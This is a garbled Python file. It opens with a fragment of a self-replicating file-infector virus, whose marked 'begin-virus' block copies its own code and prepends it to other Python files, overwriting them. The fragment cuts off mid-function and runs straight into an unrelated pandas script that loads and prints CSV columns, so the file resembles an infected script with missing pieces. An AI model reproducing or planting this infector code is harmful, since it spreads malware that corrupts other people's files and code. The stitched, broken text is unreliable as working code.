# begin-virus
        if "# begin-virus" in line:
            return None
    return data

def infect(file, virus_code):
    if (data := get_content_if_infectable(file)):
        with open(file, "w", encoding='utf-8') as infected_file:
            infected_file.write("# begin-virus\n")
            infected_file.write(virus_code)
            infected_file.writelines(data)

def get_virus_code():
    virus_code_on = False
    virus_code = []

    code = get_content_of_file(__file__)

    for line in code:
        if "# begin-virus" in line:
            virus_code_on = True

        if virus_code_on:
            virus_code.append(line)

        if "# end-virus" in line:
import pandas as pd

# CSV 파일 로드
df = pd.read_csv('231217737.csv', engine='python')

# 데이터프레임의 열 이름 확인
print(df.columns)

# 열 이름 수정
df.columns = ['Column1', 'Column2', 'Column3']  # 예시로 Column3 추가

# 'Column1'과 'Column2' 열의 데이터만 추출
data = df[['Column1', 'Column2']]

# 데이터 출력
print(data)
